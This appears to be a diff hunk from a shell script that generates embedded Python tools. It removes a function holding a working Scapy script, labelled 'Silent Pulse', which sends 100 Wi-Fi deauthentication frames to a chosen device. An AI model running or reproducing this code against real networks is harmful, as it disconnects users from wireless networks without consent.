@@ -3364,27 +3364,6 @@ if __name__ == "__main__":
 EOF
 }
 
-
-generate_wifi_pulse_code_raw() {
-    cat << 'EOF'
-from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
-import sys
-
-def deauth_pulse(target_mac, gateway_mac, iface):
-    # Конструируем пакет деавторизации на уровне L2
-    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
-    
-    print(f"[*] Sending Silent Pulse (Deauth) to {target_mac} via {iface}")
-    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
-
-if __name__ == "__main__":
-    if len(sys.argv) > 3:
-        deauth_pulse(sys.argv[1], sys.argv[2], sys.argv[3])
-EOF
-}
-
-
 generate_image_analyzer_code_raw() {
     cat << 'EOF'
 import sys
